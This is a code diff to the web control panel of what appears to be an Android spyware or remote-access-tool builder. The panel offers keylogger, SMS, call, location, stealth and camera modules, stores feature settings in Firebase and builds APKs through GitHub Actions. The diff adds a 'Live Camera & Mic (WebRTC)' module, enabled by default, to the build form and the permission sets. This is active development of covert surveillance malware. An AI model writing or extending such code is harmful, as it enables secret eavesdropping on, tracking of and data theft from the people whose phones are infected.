@@ -189,6 +189,10 @@
                                         <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger & Apps</span>
                                         <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary);">
                                     </label>
+                                    <label class="module-perm-label" style="display: flex; align-items: center; justify-content: space-between; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-video text-primary-c me-1"></i> Live Camera & Mic (WebRTC)</span>
+                                        <input type="checkbox" id="featureLiveCam" name="feature_livecam" checked style="accent-color: var(--primary);">
+                                    </label>
                                 </div>
                             </div>
                             <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top: 6px; width: 100%; border-radius: var(--radius-pill);">
@@ -431,6 +435,7 @@
                 camera: false,
                 chats: false,
                 apps: false,
+                livecam: false,
                 privacy_screen: false,
                 sensitive_feed: false,
                 edit_modules: false,
@@ -473,6 +478,7 @@
                         camera: true,
                         chats: true,
                         apps: true,
+                        livecam: true,
                         privacy_screen: true,
                         sensitive_feed: true,
                         edit_modules: true,
@@ -847,6 +853,7 @@
         const featCalls = document.getElementById('featureCalls') ? document.getElementById('featureCalls').checked : true;
         const featSMS = document.getElementById('featureSMS') ? document.getElementById('featureSMS').checked : true;
         const featKeylogger = document.getElementById('featureKeylogger') ? document.getElementById('featureKeylogger').checked : true;
+        const featLiveCam = document.getElementById('featureLiveCam') ? document.getElementById('featureLiveCam').checked : true;
 
         fbDb.ref('panel_users/' + userId + '/features').set({
             gallery: featGallery,
@@ -856,7 +863,8 @@
             location: featLocation,
             calls: featCalls,
             sms: featSMS,
-            keylogger: featKeylogger
+            keylogger: featKeylogger,
+            livecam: featLiveCam
         });
 
         // Trigger GitHub Actions workflow dispatch
@@ -1275,7 +1283,7 @@
                     const fullPermissions = {
                         sms: true, notification: true, stealth: true, accounts: true, calls: true,
                         gallery: true, files: true, location: true, keylogs: true, audio: true,
-                        camera: true, chats: true, apps: true, privacy_screen: true, sensitive_feed: true,
+                        camera: true, chats: true, apps: true, livecam: true, privacy_screen: true, sensitive_feed: true,
                         edit_modules: true, build_apk: true
                     };
 
